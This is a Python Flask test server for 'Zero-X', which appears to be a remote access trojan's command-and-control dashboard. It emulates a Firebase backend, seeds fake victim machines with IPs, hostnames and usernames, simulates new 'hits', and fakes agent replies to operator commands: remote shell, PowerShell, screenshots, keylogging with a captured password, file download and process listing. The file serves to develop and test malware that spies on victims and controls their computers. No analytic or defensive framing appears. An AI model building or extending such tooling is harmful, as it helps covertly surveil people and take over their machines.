#!/usr/bin/env python3
"""
Zero-X  ·  Local Test Server
Mimics the Firebase Realtime Database REST API so you can test the
full dashboard + agent loop on localhost — no real Firebase needed.

Run:
    pip install flask flask-cors
    python server.py

Then open:  http://localhost:5000
Dashboard will auto-connect. Use this URL + secret in Builder tab:
    DB URL  →  http://localhost:5000
    Secret  →  testtoken
"""

import json
import time
import uuid
import random
import threading
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_folder=".")
CORS(app)  # allow the dashboard (different origin) to hit this server

# ── In-memory Firebase-alike store ────────────────────────────────────────────
DB = {
    "owner": {},
    "clients": {},
}
DB_LOCK = threading.Lock()

# ── Fake clients injected on startup so the map has something to show ─────────
FAKE_CLIENTS = [
    {
        "id": "FAKE001",
        "ip": "185.220.101.47",
        "city": "Frankfurt",
        "country": "DE",
        "lat": 50.1109,
        "lon": 8.6821,
        "hostname": "DESKTOP-TEST1",
        "os_user": "john",
        "os_ver": "Windows 11 Pro 22H2",
        "arch": "x64",
        "last_seen": int(time.time() * 1000),   # online now
        "status": "online",
    },
    {
        "id": "FAKE002",
        "ip": "104.28.210.5",
        "city": "New York",
        "country": "US",
        "lat": 40.7128,
        "lon": -74.0060,
        "hostname": "LAPTOP-WORK",
        "os_user": "alice",
        "os_ver": "Windows 10 Pro 21H2",
        "arch": "x64",
        "last_seen": int(time.time() * 1000) - 120_000,  # idle (2 min ago)
        "status": "idle",
    },
    {
        "id": "FAKE003",
        "ip": "91.108.4.183",
        "city": "London",
        "country": "GB",
        "lat": 51.5074,
        "lon": -0.1278,
        "hostname": "WIN-PC-7392",
        "os_user": "user",
        "os_ver": "Windows 11 Home 23H2",
        "arch": "x64",
        "last_seen": int(time.time() * 1000) - 600_000,  # offline (10 min ago)
        "status": "offline",
    },
]

for c in FAKE_CLIENTS:
    DB["clients"][c["id"]] = c


# ─────────────────────────────────────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────────────────────────────────────

def db_get(path: str):
    """Traverse DB dict by slash-separated path."""
    parts = [p for p in path.strip("/").split("/") if p]
    node = DB
    for p in parts:
        if not isinstance(node, dict) or p not in node:
            return None
        node = node[p]
    return node


def db_set(path: str, value):
    """Set a value at path, creating intermediate dicts as needed."""
    parts = [p for p in path.strip("/").split("/") if p]
    if not parts:
        return
    node = DB
    for p in parts[:-1]:
        if p not in node or not isinstance(node[p], dict):
            node[p] = {}
        node = node[p]
    node[parts[-1]] = value


def db_patch(path: str, update: dict):
    """Merge update dict into existing node at path."""
    existing = db_get(path)
    if not isinstance(existing, dict):
        existing = {}
    existing.update(update)
    db_set(path, existing)


def db_delete(path: str):
    """Delete node at path."""
    parts = [p for p in path.strip("/").split("/") if p]
    if not parts:
        return
    node = DB
    for p in parts[:-1]:
        if not isinstance(node, dict) or p not in node:
            return
        node = node[p]
    node.pop(parts[-1], None)


def check_auth():
    """Accept any token for local testing."""
    # In real Firebase the token comes as ?auth=... query param
    # We just let everything through locally.
    return True


# ─────────────────────────────────────────────────────────────────────────────
#  Firebase REST API emulation
#  Firebase paths look like:  /clients/ABC123.json?auth=TOKEN
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/<path:fb_path>.json", methods=["GET", "PUT", "PATCH", "DELETE"])
def firebase_rest(fb_path):
    path = "/" + fb_path

    with DB_LOCK:
        if request.method == "GET":
            val = db_get(path)
            return jsonify(val)  # returns null if not found — matches Firebase

        elif request.method == "PUT":
            body = request.get_json(force=True, silent=True)
            if body is None:
                db_delete(path)  # PUT null = delete in Firebase
            else:
                db_set(path, body)
            return jsonify(body)

        elif request.method == "PATCH":
            body = request.get_json(force=True, silent=True) or {}
            db_patch(path, body)
            return jsonify(body)

        elif request.method == "DELETE":
            db_delete(path)
            return jsonify(None)

    return jsonify({"error": "method not allowed"}), 405


# ─────────────────────────────────────────────────────────────────────────────
#  Static file serving (serves your dashboard files from current directory)
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return send_from_directory(".", "index.html")


@app.route("/<path:filename>")
def static_files(filename):
    # Don't intercept .json paths (handled above)
    if filename.endswith(".json"):
        return jsonify(None)
    try:
        return send_from_directory(".", filename)
    except Exception:
        return "Not found", 404


# ─────────────────────────────────────────────────────────────────────────────
#  Debug routes — handy during testing
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/_debug/db")
def debug_db():
    """See the full in-memory DB at any time."""
    with DB_LOCK:
        return jsonify(DB)


@app.route("/_debug/add_fake_client")
def debug_add_client():
    """Add a random fake client to simulate a new hit."""
    cities = [
        ("Tokyo",      "JP",  35.6762, 139.6503),
        ("Sydney",     "AU", -33.8688, 151.2093),
        ("São Paulo",  "BR", -23.5505, -46.6333),
        ("Paris",      "FR",  48.8566,   2.3522),
        ("Cape Town",  "ZA", -33.9249,  18.4241),
        ("Toronto",    "CA",  43.6532, -79.3832),
        ("Moscow",     "RU",  55.7558,  37.6173),
        ("Mumbai",     "IN",  19.0760,  72.8777),
    ]
    city, country, lat, lon = random.choice(cities)
    cid = uuid.uuid4().hex[:8].upper()
    client = {
        "id":       cid,
        "ip":       f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "city":     city,
        "country":  country,
        "lat":      lat,
        "lon":      lon,
        "hostname": f"DESKTOP-{cid}",
        "os_user":  random.choice(["admin", "user", "john", "alice", "bob"]),
        "os_ver":   "Windows 11 Pro 22H2",
        "arch":     "x64",
        "last_seen": int(time.time() * 1000),
        "status":   "online",
    }
    with DB_LOCK:
        DB["clients"][cid] = client
    return jsonify({"added": cid, "client": client})


@app.route("/_debug/simulate_command_result/<client_id>")
def debug_simulate_result(client_id):
    """
    Simulate an agent responding to whatever pending_cmd is queued.
    Useful for testing the terminal without a real compiled agent.
    """
    with DB_LOCK:
        pending = db_get(f"/clients/{client_id}/pending_cmd")
        if not pending:
            return jsonify({"error": "no pending command for this client"}), 404

        cmd_id  = pending.get("id", "")
        cmd_type = pending.get("type", "shell")
        payload  = pending.get("payload", "")

        # Fake outputs per command type
        fake_outputs = {
            "shell":      f"Microsoft Windows [Version 10.0.22621.3296]\n(c) Microsoft Corporation.\n\nC:\\Users\\user>{payload}\n{payload.upper()} EXECUTED\n",
            "ps":         f"PS C:\\Users\\user> {payload}\nCommandType : Function\nOutput      : Simulated PS result\n",
            "sysinfo":    "Hostname  : DESKTOP-TEST\nUsername  : testuser\nOS        : Windows 11 22H2\nArch      : x64\nPublic IP : 1.2.3.4\n",
            "screenshot": "",   # empty = dashboard won't show an image (fine for testing)
            "keylog":     "hello world<ENTER>\npassword123<ENTER>\nsome more typing here\n",
            "ls":         "<DIR>             Desktop\n<DIR>             Documents\n<DIR>             Downloads\n      102400  notes.txt\n     2048000  archive.zip\n",
            "download":   "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBmYWtlIGZpbGUgY29udGVudC4=",
            "pslist":     "[   4]  System\n[ 108]  svchost.exe\n[ 892]  explorer.exe\n[1234]  chrome.exe\n[5678]  notepad.exe\n",
            "kill":       "Agent terminating.",
        }

        output = fake_outputs.get(cmd_type, f"(simulated result for: {cmd_type})")
        result = {
            "cmd_id": cmd_id,
            "output": output,
            "ts":     int(time.time() * 1000),
        }
        db_set(f"/clients/{client_id}/cmd_result", result)

    return jsonify({"simulated": True, "cmd_id": cmd_id, "type": cmd_type})


# ─────────────────────────────────────────────────────────────────────────────
#  Command-watching thread — auto-simulates responses if you want it
#  Set AUTO_RESPOND = True to have the server auto-reply to every command
# ─────────────────────────────────────────────────────────────────────────────

AUTO_RESPOND = False   # flip to True to test terminal flow end-to-end without an agent

def auto_respond_loop():
    last_cmd_ids = {}
    while True:
        time.sleep(1)
        if not AUTO_RESPOND:
            continue
        with DB_LOCK:
            clients = DB.get("clients", {})
            for cid, client in clients.items():
                pending = client.get("pending_cmd")
                if not pending:
                    continue
                cmd_id = pending.get("id", "")
                if last_cmd_ids.get(cid) == cmd_id:
                    continue
                last_cmd_ids[cid] = cmd_id
                # Simulate a short processing delay
                threading.Timer(1.5, lambda c=cid, p=pending: _auto_reply(c, p)).start()

def _auto_reply(client_id, pending):
    cmd_id   = pending.get("id", "")
    cmd_type = pending.get("type", "shell")
    payload  = pending.get("payload", "")
    output   = f"[AUTO-SIMULATED] type={cmd_type} payload={payload}\nOK"
    result   = {"cmd_id": cmd_id, "output": output, "ts": int(time.time() * 1000)}
    with DB_LOCK:
        db_set(f"/clients/{client_id}/cmd_result", result)

threading.Thread(target=auto_respond_loop, daemon=True).start()


# ─────────────────────────────────────────────────────────────────────────────
#  Entry
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║           Zero-X  ·  Local Test Server                   ║
╠══════════════════════════════════════════════════════════╣
║  Dashboard  →  http://localhost:5000                     ║
║                                                          ║
║  In Builder tab, use:                                    ║
║    DB URL   →  http://localhost:5000                     ║
║    Secret   →  testtoken  (anything works locally)       ║
║                                                          ║
║  Debug endpoints:                                        ║
║    /‌_debug/db                   see full DB state        ║
║    /‌_debug/add_fake_client       add a random pin        ║
║    /‌_debug/simulate_command_result/<id>  fake agent resp ║
╚══════════════════════════════════════════════════════════╝
""")
    app.run(host="0.0.0.0", port=5000, debug=False)
